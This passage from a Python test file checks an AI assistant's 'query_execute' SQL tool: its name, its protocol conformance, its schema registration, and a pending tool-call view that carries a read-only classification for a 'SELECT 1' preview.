    assert tool.name == "query_execute"


def test_query_execute_satisfies_the_tool_protocol():
    tool: AssistantTool = QueryExecuteTool()
    assert tool.name == "query_execute"
    assert callable(tool.preview)
    assert callable(tool.run)


def test_tool_schema_is_advertised_to_the_model():
    from app.modules.assistant.registry import tool_registry

    schemas = AssistantLoop._tool_schemas(
        AssistantLoop(provider=FakeProvider([]), registry=tool_registry)
    )
    names = {s["function"]["name"] for s in schemas}
    assert "query_execute" in names


def test_tool_call_view_carries_the_classification():
    view = ToolCallView(
        tool_call_id="c1",
        tool_name="query_execute",
        sql_preview="SELECT 1",
        classification="read_only",
    )
    assert view.status == "pending"
    assert view.classification == "read_only"


async def _deny() -> bool:
    return False
